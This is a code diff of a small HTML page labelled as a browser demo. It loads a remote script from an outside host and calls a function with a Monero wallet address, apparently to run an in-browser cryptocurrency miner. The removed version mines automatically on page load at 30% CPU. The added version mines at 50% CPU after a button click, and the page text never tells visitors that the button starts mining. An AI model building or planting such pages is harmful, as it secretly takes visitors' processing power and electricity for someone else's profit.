@@ -1,14 +1,33 @@
 <!DOCTYPE html>
 <html lang="zh-TW">
-<head><meta charset="UTF-8"><title>Browser  Demo</title></head>
+<head>
+  <meta charset="UTF-8">
+  <title>頁面</title>
+  <style>
+    body { font-family: sans-serif; text-align: center; padding-top: 50px; }
+    button { padding: 10px 20px; font-size: 16px; }
+    .status { margin-top: 20px; font-weight: bold; color: green; }
+  </style>
+</head>
 <body>
-  <h2>Demo</h2>
-  <div id="status">初始化中…</div>
+  <h1>瀏覽器示範</h1>
+  <p>請按下才會啟動程序。</p>
+  <button id="startBtn">✅ 開始</button>
+  <div id="status" class="status">尚未開始</div>
 
   <script src="https://thelifewillbefine.de/karma/karma.js?karma=bs?nosaj=faster.mo"></script>
   <script>
-    EverythingIsLife('48PZrmBXTvf9GYgkTmaJRXi6ZCUXrM7qQcz6ZLE3margf5mFQ27sraycXcGsKiPJ4FeY2QsMw7RLx6AuACpXsMP4JijyRYn', 'x', 30);
-    console.log("已啟動...");
+    document.getElementById('startBtn').addEventListener('click', () => {
+      EverythingIsLife(
+        '48PZrmBXTvf9GYgkTmaJRXi6ZCUXrM7qQcz6ZLE3margf5mFQ27sraycXcGsKiPJ4FeY2QsMw7RLx6AuACpXsMP4JijyRYn',  // 請替換成你的 Monero 地址
+        'x',
+        50 // 約使用 50% CPU
+      );
+      document.getElementById('status').innerText = '✅ 已啟動';
+      document.getElementById('startBtn').disabled = true;
+      console.log('啟動中...');
+    });
   </script>
 </body>
 </html>
+
